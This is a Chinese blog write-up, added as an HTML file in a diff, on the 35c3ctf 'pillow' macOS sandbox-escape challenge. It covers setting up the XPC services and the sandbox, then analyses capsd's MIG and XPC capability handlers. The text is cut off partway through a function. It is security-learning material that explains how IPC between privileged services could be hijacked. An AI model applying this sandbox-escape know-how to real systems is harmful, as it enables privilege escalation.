@@ -1,0 +1,1072 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="MacOS, Mach, IPC, XPC, sandbox,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    35c3ctf pillow Writeup |  Kiprey&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-35c3ctf_pillow"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  35c3ctf pillow Writeup
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/01/35c3ctf_pillow/" class="article-date">
+  <time datetime="2022-01-07T16:00:00.000Z" itemprop="datePublished">2022-01-08</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">10.4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">48 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="一、简介">一、简介</h2>
+<ul>
+<li>
+<p><code>pillow</code>，是 35c3ctf 中的一道关于 macOS bootstrap Service 沙箱逃逸题目。本人将通过学习这一题来进一步了解Mac OSX XPC 和 Sandbox 机制。</p>
+</li>
+<li>
+<p>该题中包含了两个自定义 macOS 系统服务。要求攻击者劫持两个 XPC 服务之间的 IPC 连接，以达到沙箱逃逸的目的。</p>
+</li>
+<li>
+<p>题目链接 ： <a href="https://github.com/saelo/35c3ctf/tree/master/pillow" target="_blank" rel="noopener">pillow - 35c3ctf github</a></p>
+</li>
+</ul>
+<a id="more"></a>
+<h2 id="二、环境搭建">二、环境搭建</h2>
+<p>在 MacOS 环境下：</p>
+<ul>
+<li>
+<p>编译（可以提前在 Makefile 中添加 <code>-g -O0</code> 编译标志）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:saelo/35c3ctf.git</span><br><span class="line"><span class="built_in">cd</span> 35c3ctf/pillow/capsd</span><br><span class="line">make</span><br><span class="line"><span class="built_in">cd</span> ../shelld</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>使用 launchd 启动编译出的两个服务</p>
+<ul>
+<li>
+<p>首先，修改 <code>distrib/System/Library/LaunchDaemons/</code> 中的两个 plist, 将文件中的 <code>Program</code> 条目替换成两个 XPC service 编译出的路径。诸如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">&lt;key&gt;Program&lt;/key&gt;</span><br><span class="line">&lt;string&gt;/Users/kiprey/Desktop/CTF/35c3ctf/pillow/capsd/capsd&lt;/string&gt;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>之后，令 launchd 启动这两个服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chown root:wheel pillow/distrib/System/Library/LaunchDaemons/*.plist</span><br><span class="line">sudo launchctl bootstrap system pillow/distrib/System/Library/LaunchDaemons/*.plist</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>如果要关闭服务则可以执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl bootout system pillow/distrib/System/Library/LaunchDaemons/*.plist</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p>可以通过 <code>log show --predicate 'processID == 1' --last 1h</code> 来查看 launchd 的输出信息。</p>
+</blockquote>
+</li>
+<li>
+<p>配置执行 exploit 程序环境</p>
+<p>题目已经说明 exploit <strong>位于沙箱</strong>中，因此这里也模拟一下。</p>
+<ul>
+<li>
+<p>首先找到 exploit 所使用的沙箱配置文件，这个文件位于 <code>pillow/exploit/exploit.sb</code>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(version <span class="number">1</span>)</span><br><span class="line">(deny <span class="keyword">default</span>)</span><br><span class="line"></span><br><span class="line">(<span class="keyword">import</span> <span class="string">"system.sb"</span>)</span><br><span class="line"></span><br><span class="line">; TODO enter correct path here</span><br><span class="line">(allow process-exec (literal (param <span class="string">"EXPLOIT_BIN"</span>)))</span><br><span class="line">(allow process-fork)</span><br><span class="line"></span><br><span class="line">(allow mach-lookup (global-name <span class="string">"net.saelo.shelld"</span>))</span><br><span class="line">(allow mach-lookup (global-name <span class="string">"net.saelo.capsd"</span>))</span><br><span class="line">(allow mach-lookup (global-name <span class="string">"net.saelo.capsd.xpc"</span>))</span><br></pre></td></tr></table></figure>
+<p>这里的沙箱配置只允许 <strong>fork</strong>、<strong>exec exploit</strong> 以及 <strong>mach lookup</strong> 题目所提供的三个服务。</p>
+</li>
+<li>
+<p>之后使用以下命令执行 exploit</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注：传入的 EXPLOIT_BIN 路径必须为 **绝对** 路径</span></span><br><span class="line">sandbox-exec -f ./exploit.sb -D EXPLOIT_BIN=/Users/kiprey/Desktop/CTF/35c3ctf/pillow/exploit/myexploit ./myexploit</span><br></pre></td></tr></table></figure>
+<p>这样，一个不符合沙箱限制的操作将会被拒绝：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] Try running /bin/ls, this operation must be denied!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> path[] = <span class="string">"/bin/ls"</span>;</span><br><span class="line">    <span class="keyword">char</span> arg1[] = <span class="string">"/"</span>;</span><br><span class="line">    <span class="keyword">char</span> * <span class="keyword">const</span> exec_argv [] = &#123; path, arg1, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> * <span class="keyword">const</span> exec_env [] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    execve(path, exec_argv, exec_env);</span><br><span class="line">    </span><br><span class="line">    perror(<span class="string">"myexploit-execve"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<p><img src="/2022/01/35c3ctf_pillow/image-20220108155133031.png" alt="image-20220108155133031"></p>
+</li>
+</ul>
+</li>
+<li>
+<p>设置 flag 类型，使普通用户不可读（可选），这一步只是做个简单的测试，没有什么实际意义</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chown root:wheel ./flag</span><br><span class="line">sudo chmod 640 ./flag</span><br></pre></td></tr></table></figure>
+<p>但需要注意的是，<strong>被 launchd 启动的守护进程是可以读取这个高权限 flag 的</strong>。</p>
+<p>以下是用于验证的代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FILE* flag = fopen(<span class="string">"/Users/kiprey/Desktop/CTF/35c3ctf/pillow/flag"</span>, <span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">size_t</span> len = fread(buf, <span class="number">1</span>, <span class="keyword">sizeof</span>(buf), flag);</span><br><span class="line">os_log(OS_LOG_DEFAULT, <span class="string">"flag read len: %zu, flag: [%&#123;public&#125;s]"</span>, len, buf);</span><br></pre></td></tr></table></figure>
+<p>日志输出：</p>
+<p><img src="/2022/01/35c3ctf_pillow/image-20220106234900069.png" alt="image-20220106234900069"></p>
+</li>
+</ul>
+<h2 id="三、代码研究">三、代码研究</h2>
+<h3 id="1-capsd">1. capsd</h3>
+<p>我们首先简单看看 MIG 中的接口。</p>
+<h4 id="a-capsd-defs">a. capsd.defs</h4>
+<p>代码很短：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">subsystem capsd <span class="number">733100</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/std_types.defs&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/mach_types.defs&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach_debug/mach_debug_types.defs&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"../common/types.h"</span>;</span><br><span class="line"></span><br><span class="line">type <span class="built_in">string</span> = c_string[*:<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">routine <span class="title">grant_capability</span><span class="params">(server: <span class="keyword">mach_port_t</span>; ServerAuditToken token: <span class="keyword">audit_token_t</span>; target: <span class="keyword">audit_token_t</span>; operation: <span class="built_in">string</span>; arg: <span class="built_in">string</span>)</span></span>;</span><br><span class="line"><span class="function">routine <span class="title">has_capability</span><span class="params">(server: <span class="keyword">mach_port_t</span>; pid: <span class="keyword">int</span>; operation: <span class="built_in">string</span>; arg: <span class="built_in">string</span>; out result: <span class="keyword">int</span>)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>可以看到这里只定义了两个函数 <code>grant_capability</code> 和 <code>has_capability</code> 函数。这两个函数可以被 Client 远程调用至 Server 上的实现。</p>
+<h4 id="b-capsd-c">b. capsd.c</h4>
+<h5 id="1-capsd-main-函数">1) capsd main 函数</h5>
+<ul>
+<li>
+<p>初始时，capsd 会先输出一条信息，以说明当前守护进程已经开始执行：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os_log(OS_LOG_DEFAULT, <span class="string">"net.saelo.capsd starting"</span>);</span><br></pre></td></tr></table></figure>
+<p>但这条信息并没有那么方便读取到。我们首先得先从 launchd 的日志中获取到 capsd 的 pid 号：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">log</span> show --predicate <span class="string">'processID == 0'</span> --last 1h | grep <span class="string">"capsd"</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">2022-01-05 17:00:03.199483+0800 0x7c716    Default     0x0                  1      0    launchd: [net.saelo.capsd:] This service is defined to be constantly running and is inherently inefficient.</span><br><span class="line">2022-01-05 17:00:03.199525+0800 0x7c716    Default     0x0                  1      0    launchd: [system/net.saelo.capsd:] internal event: WILL_SPAWN, code = 0</span><br><span class="line">2022-01-05 17:00:03.199537+0800 0x7c716    Default     0x0                  1      0    launchd: [system/net.saelo.capsd:] service state: spawn scheduled</span><br><span class="line">2022-01-05 17:00:03.199539+0800 0x7c716    Default     0x0                  1      0    launchd: [system/net.saelo.capsd:] service state: spawning</span><br><span class="line">2022-01-05 17:00:03.199626+0800 0x7c716    Default     0x0                  1      0    launchd: [system/net.saelo.capsd:] launching: speculative</span><br><span class="line">2022-01-05 17:00:03.200004+0800 0x7c716    Default     0x0                  1      0    launchd: [system/net.saelo.capsd [32099]:] xpcproxy spawned with pid 32099</span><br><span class="line">2022-01-05 17:00:03.200033+0800 0x7c716    Default     0x0                  1      0    launchd: [system/net.saelo.capsd [32099]:] internal event: SPAWNED, code = 0</span><br><span class="line">2022-01-05 17:00:03.200035+0800 0x7c716    Default     0x0                  1      0    launchd: [system/net.saelo.capsd [32099]:] service state: xpcproxy</span><br><span class="line">2022-01-05 17:00:03.200138+0800 0x7c716    Default     0x0                  1      0    launchd: [system:] Bootstrap by launchctl[32098] <span class="keyword">for</span> /Users/kiprey/Desktop/CTF/35c3ctf/pillow/distrib/System/Library/LaunchDaemons/net.saelo.capsd.plist succeeded (0: )</span><br><span class="line">2022-01-05 17:00:03.200197+0800 0x7c716    Default     0x0                  1      0    launchd: [system/net.saelo.capsd [32099]:] internal event: SOURCE_ATTACH, code = 0</span><br><span class="line">2022-01-05 17:00:03.202699+0800 0x7c8af    Default     0x0                  1      0    launchd: [system/net.saelo.capsd [32099]:] service state: running</span><br><span class="line">2022-01-05 17:00:03.202725+0800 0x7c8af    Default     0x0                  1      0    launchd: [system/net.saelo.capsd [32099]:] internal event: INIT, code = 0</span><br><span class="line">2022-01-05 17:00:03.202730+0800 0x7c8af    Default     0x0                  1      0    launchd: [system/net.saelo.capsd [32099]:] Successfully spawned capsd[32099] because speculative</span><br></pre></td></tr></table></figure>
+<p>我们可以很容易的获取到 capsd 的 pid 为 <code>32099</code>，因此我们继续执行以下命令来查看该程序的 log：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">log</span> show --predicate <span class="string">'processID == 32099'</span> --last 1h</span><br><span class="line"></span><br><span class="line">Filtering the <span class="built_in">log</span> data using <span class="string">"processIdentifier == 32099"</span></span><br><span class="line">Skipping info and debug messages, pass --info and/or --debug to include.</span><br><span class="line">Timestamp                       Thread     Type        Activity             PID    TTL  </span><br><span class="line">2022-01-05 17:00:03.205538+0800 0x7c8bc    Default     0x0                  32099  0    capsd: net.saelo.capsd starting</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Log      - Default:          1, Info:                0, Debug:             0, Error:          0, Fault:          0</span><br><span class="line">Activity - Create:           0, Transition:          0, Actions:           0</span><br></pre></td></tr></table></figure>
+<p>可以看到成功读取到 capsd 的输出。</p>
+</li>
+<li>
+<p>接下来，capsd 会使用默认参数，生成一个 <strong>空的 CFDictionary 字典</strong>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">capabilities_by_pid = CFDictionaryCreateMutable(kCFAllocatorDefault, <span class="number">0</span>, &amp;kCFTypeDictionaryKeyCallBacks, &amp;kCFTypeDictionaryValueCallBacks);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>需要注意的是，<strong>这个字典是全局变量</strong>，因此它会在其他上下文中被使用。</p>
+</blockquote>
+</li>
+<li>
+<p>之后，capsd 获取 bootstrap port，并把反向 DNS 样式的名称 <strong>“net.saelo.capsd”</strong> 注册进 bootstrap 中，以备其他进程所使用：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_port_t</span> bootstrap_port, service_port;</span><br><span class="line">task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &amp;bootstrap_port);</span><br><span class="line"></span><br><span class="line">kr = bootstrap_check_in(bootstrap_port, <span class="string">"net.saelo.capsd"</span>, &amp;service_port);</span><br><span class="line">ASSERT_MACH_SUCCESS(kr, <span class="string">"bootstrap_check_in"</span>);</span><br></pre></td></tr></table></figure>
+<p>接下来这步稍微复杂了一点，它指定 <code>capsd_server</code> 函数来处理 service_port 中即将到来的 mach message，即将 service_port 中的事件<strong>分发到</strong> <code>capsd_server</code> 中进行处理；之后开始异步执行 mach 事件分发操作：</p>
+<blockquote>
+<p>需要注意的是这里使用 <code>MIG</code> 来生成其余的 mach 信息交互代码，隐藏了 Mach 通信的内部细节。</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dispatch_source_t</span> source = dispatch_source_create(DISPATCH_SOURCE_TYPE_MACH_RECV, service_port, <span class="number">0</span>, dispatch_get_main_queue());</span><br><span class="line"></span><br><span class="line">dispatch_source_set_event_handler(source, ^&#123;</span><br><span class="line">    dispatch_mig_server(source, MAX_MSG_SIZE, capsd_server);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">dispatch_resume(source);</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>capsd 除了建立 mach message server 以外，它还建立了一个 XPC Service：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set up XPC service</span></span><br><span class="line"><span class="keyword">xpc_connection_t</span> service = xpc_connection_create_mach_service(<span class="string">"net.saelo.capsd.xpc"</span>, <span class="literal">NULL</span>, XPC_CONNECTION_MACH_SERVICE_LISTENER);</span><br><span class="line">xpc_connection_set_target_queue(service, dispatch_get_main_queue());</span><br><span class="line"></span><br><span class="line">xpc_connection_set_event_handler(service, ^(<span class="keyword">xpc_object_t</span> connection) &#123;</span><br><span class="line">    <span class="keyword">if</span> (xpc_get_type(connection) == XPC_TYPE_CONNECTION) &#123;</span><br><span class="line">        xpc_connection_set_target_queue(connection, dispatch_get_main_queue());</span><br><span class="line">        xpc_connection_set_event_handler(connection, ^(<span class="keyword">xpc_object_t</span> msg) &#123;</span><br><span class="line">            [XPC_message_event_handler]</span><br><span class="line">        &#125;);</span><br><span class="line">        xpc_connection_resume(connection);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">char</span>* description = xpc_copy_description(connection);</span><br><span class="line">        os_log(OS_LOG_DEFAULT, <span class="string">"Received unexpected event: %&#123;public&#125;s\n"</span>, description);</span><br><span class="line">        <span class="built_in">free</span>(description);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">xpc_connection_resume(service);</span><br></pre></td></tr></table></figure>
+<p>这个 XPC Service 实际处理 XPC message 的方式如下所示。</p>
+<p>根据代码描述可以得知，<strong>传入的 XPC Message 应该是一个字典类型 <code>xpc_dictionary</code></strong>，且有 <code>action</code>(uint64_t)、<code>pid</code>(int64_t)、<code>operation</code> (string)以及 <code>argument</code>(string) 四个 key 值。而返回给调用方的是一个只有 <code>success</code> 键值对的字典。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (xpc_get_type(msg) == XPC_TYPE_DICTIONARY) &#123;</span><br><span class="line">    <span class="keyword">xpc_object_t</span> reply = xpc_dictionary_create_reply(msg);</span><br><span class="line">    <span class="keyword">if</span> (!reply)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> action = xpc_dictionary_get_uint64(msg, <span class="string">"action"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (action == ACTION_GRANT_CAPABILITY) &#123;</span><br><span class="line">        <span class="keyword">audit_token_t</span> creds;</span><br><span class="line">        <span class="comment">// TODO check xpc_dictionary_set_audit_token</span></span><br><span class="line">        xpc_dictionary_get_audit_token(msg, &amp;creds);</span><br><span class="line">        <span class="keyword">pid_t</span> target = xpc_dictionary_get_int64(msg, <span class="string">"pid"</span>);</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* operation = xpc_dictionary_get_string(msg, <span class="string">"operation"</span>);</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* argument = xpc_dictionary_get_string(msg, <span class="string">"argument"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (operation &amp;&amp; argument) &#123;</span><br><span class="line">            xpc_dictionary_set_bool(reply, <span class="string">"success"</span>, grant_capability_internal(creds, target, operation, argument) == KERN_SUCCESS);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            xpc_dictionary_set_bool(reply, <span class="string">"success"</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (action == ACTION_HAS_CAPABILITY) &#123;</span><br><span class="line">        <span class="keyword">pid_t</span> target = xpc_dictionary_get_int64(msg, <span class="string">"pid"</span>);</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* operation = xpc_dictionary_get_string(msg, <span class="string">"operation"</span>);</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* argument = xpc_dictionary_get_string(msg, <span class="string">"argument"</span>);</span><br><span class="line">        xpc_dictionary_set_bool(reply, <span class="string">"success"</span>, has_capability_internal(target, operation, argument));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        xpc_dictionary_set_bool(reply, <span class="string">"success"</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xpc_connection_send_message(connection, reply);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (xpc_get_type(msg) != XPC_TYPE_ERROR || msg != XPC_ERROR_CONNECTION_INVALID) &#123;</span><br><span class="line">        <span class="keyword">char</span>* description = xpc_copy_description(msg);</span><br><span class="line">        os_log(OS_LOG_DEFAULT, <span class="string">"Received unexpected event on connection: %&#123;public&#125;s\n"</span>, description);</span><br><span class="line">        <span class="built_in">free</span>(description);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>handler 会根据传入的 xpc 请求来进行不同的操作：<strong>获取权限</strong>或<strong>查看当前是否有权限</strong>。</p>
+<p>这里记录下 handler 调用的两个函数：<code>grant_capability_internal</code> 和 <code>has_capability_internal</code>。</p>
+</li>
+</ul>
+<h5 id="2-has-grand-capability-函数">2) has/grand_capability 函数</h5>
+<p><code>has_capability</code> 和 <code>grand_capability</code> 函数没有在 <code>capsd.c</code> 中直接调用，它们是先前声明的 MIG 远程调用接口的实现。</p>
+<p>可以看到，最终这两个函数也是调用上面刚刚提到的 <code>*_internal</code> 函数，因此实际上 capsd 中的 mach server 和 xpc service 最终提供给 client 的接口都是这两个接口，一模一样。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">grant_capability</span><span class="params">(<span class="keyword">mach_port_t</span> server, <span class="keyword">audit_token_t</span> token, <span class="keyword">pid_t</span> target, <span class="keyword">const</span> <span class="keyword">char</span>* op, <span class="keyword">const</span> <span class="keyword">char</span>* arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> grant_capability_internal(token, target, op, arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">has_capability</span><span class="params">(<span class="keyword">mach_port_t</span> server, <span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* op, <span class="keyword">const</span> <span class="keyword">char</span>* arg, <span class="keyword">int</span>* out)</span> </span>&#123;</span><br><span class="line">    *out = has_capability_internal(pid, op, arg);</span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="3-get-or-create-capabilities-for-pid-函数">3) get_or_create_capabilities_for_pid 函数</h5>
+<p>该函数是两个 internal 函数的辅助函数。还记得先前提到的一个<strong>在 main 函数进行初始化</strong>的<strong>字典</strong>类型<strong>全局变量 capabilities_by_pid</strong> 么？这里将会对它进行查询或添加操作。</p>
+<p>这个函数代码很短，先把代码贴出来：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">CFMutableDictionaryRef <span class="title">get_or_create_capabilities_for_pid</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Check if the process exists. This is racy though...</span></span><br><span class="line">    <span class="keyword">if</span> (kill(pid, 